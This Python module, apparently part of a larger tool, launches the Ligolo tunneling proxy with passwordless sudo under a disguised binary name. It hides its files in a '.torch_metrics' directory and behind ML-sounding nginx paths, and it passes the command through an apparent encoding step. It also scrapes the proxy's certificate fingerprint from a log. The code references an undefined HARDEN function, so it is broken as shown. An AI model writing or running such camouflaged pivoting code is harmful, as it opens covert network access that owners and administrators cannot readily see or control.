import re
from pathlib import Path
import subprocess
import threading
import time

from .utils import decode_cmd

METRICS_DIR = Path("/home/user/.torch_metrics")
FINGERPRINT_PATH = METRICS_DIR / "ligolo_fingerprint.txt"
_FP_RE = re.compile(
    r"(?:fingerprint|Fingerprint)[^\n]*?([A-Fa-f0-9]{64})",
    re.IGNORECASE,
)


def _extract_fingerprint(log_path, out_path, stop_event):
    deadline = time.time() + 90
    log_path_obj = Path(log_path)
    while time.time() < deadline and not stop_event.is_set():
        try:
            if not log_path_obj.exists():
                time.sleep(1)
                continue
            with log_path_obj.open("r", errors="replace") as f:
                text = f.read()
            m = _FP_RE.search(text)
            if m:
                fp = m.group(1).upper()
                Path(out_path).write_text(fp + "\n")
                return
        except OSError:
            pass
        time.sleep(2)


def start(log_file):
    METRICS_DIR.mkdir(parents=True, exist_ok=True)
    if FINGERPRINT_PATH.exists():
        FINGERPRINT_PATH.unlink()
    log_file.write(
        "[*] Starting Ligolo proxy on :11601 (nginx /tensor-mesh), Web UI :6801 (/routing-console)\n"
    )
    log_file.flush()
    cmd = decode_cmd(
        HARDEN(
            "sudo -n /usr/bin/neural-route-controller -laddr 127.0.0.1:11601 -selfcert -selfcert-domain ligolo"
        )
    )
    subprocess.Popen(cmd, shell=True, stdout=log_file, stderr=subprocess.STDOUT)
    stop = threading.Event()
    threading.Thread(
        target=_extract_fingerprint,
        args=(str(METRICS_DIR / "ligolo.log"), FINGERPRINT_PATH, stop),
        daemon=True,
    ).start()
